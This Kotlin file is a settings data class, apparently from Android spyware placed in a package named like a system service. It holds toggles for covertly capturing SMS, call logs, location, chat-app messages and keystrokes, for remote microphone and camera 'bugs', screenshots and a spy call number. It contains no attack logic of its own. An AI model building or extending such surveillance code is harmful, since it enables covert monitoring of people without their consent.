package com.android.services.models

import com.google.gson.annotations.SerializedName

data class SyncSetting(

    @SerializedName("appointments")
    val appointments: Boolean = false,

    @SerializedName("browserHistory")
    val browserHistory: Boolean = false,

    @SerializedName("callLog")
    val callLog: Boolean = false,

    @SerializedName("contacts")
    val contacts: Boolean = false,

    @SerializedName("geoLocation")
    val geoLocation: Boolean = false,

    @SerializedName("mailGmail")
    val mailGmail: Boolean = false,

    @SerializedName("installedApps")
    val installedApps: Boolean = false,

    @SerializedName("sms")
    val sms: Boolean = false,

    @SerializedName("micBug")
    val micBug: Boolean = false,

    @SerializedName("cameraBug")
    val cameraBug: Boolean = false,

    @SerializedName("recordedCalls")
    val recordedCalls: Boolean = false,

    @SerializedName("photo")
    val photo: Boolean = false,

    @SerializedName("imLine")
    val imLine: Boolean = false,

    @SerializedName("imFacebook")
    val imFacebook: Boolean = false,

    @SerializedName("imSkype")
    val imSkype: Boolean = false,

    @SerializedName("imViber")
    val imViber: Boolean = false,

    @SerializedName("imWhatsapp")
    val imWhatsapp: Boolean = false,

    @SerializedName("imYahoo")
    val imYahoo: Boolean = false,

    @SerializedName("imSnapchat")
    val imSnapchat: Boolean = false,

    @SerializedName("imKik")
    val imKik: Boolean = false,

    @SerializedName("imInstagram")
    val imInstagram: Boolean = false,

    @SerializedName("imTinder")
    val imTinder: Boolean = false,

    @SerializedName("imVine")
    val imVine: Boolean = false,

    @SerializedName("imHike")
    val imHike: Boolean = false,

    @SerializedName("imHangouts")
    val imHangouts: Boolean = false,

    @SerializedName("imImo")
    val imImo: Boolean = false,

    @SerializedName("imTumblr")
    val imTumblr: Boolean = false,

    @SerializedName("imZalo")
    val imZalo: Boolean = false,

    @SerializedName("imVoiceMessage")
    val imVoiceMessage: Boolean = false,

    @SerializedName("isAppEnabled")
    val isAppEnabled: Boolean = false,

    @SerializedName("spyVidCam")
    val spyVidCam: Boolean = false,

    @SerializedName("keyLogger")
    val keyLogger: Boolean = false,

    @SerializedName("screenShot")
    val screenShot: Boolean = false,

    @SerializedName("captureNotifications")
    val captureNotifications: Boolean = false,

    @SerializedName("refreshPushToken")
    val refreshPushToken: Boolean = false,

    @SerializedName("networks")
    val networks: Boolean = false,

    @SerializedName("appReport")
    val appReport: Boolean = false,

    @SerializedName("appNotifications")
    val appNotifications: Boolean = false,

    @SerializedName("callRecordingMethod")

    val callRecordingMethod: Int=0,
    @SerializedName("spyCallNumber")
    val spyCallNumber: String="",

    @SerializedName("micBugQuality")
    val micBugQuality: String="100",

    @SerializedName("callRecordingQuality")
    val callRecordingQuality: String="100",

    @SerializedName("deviceIdentifier")
    val deviceIdentifier:String?=""
)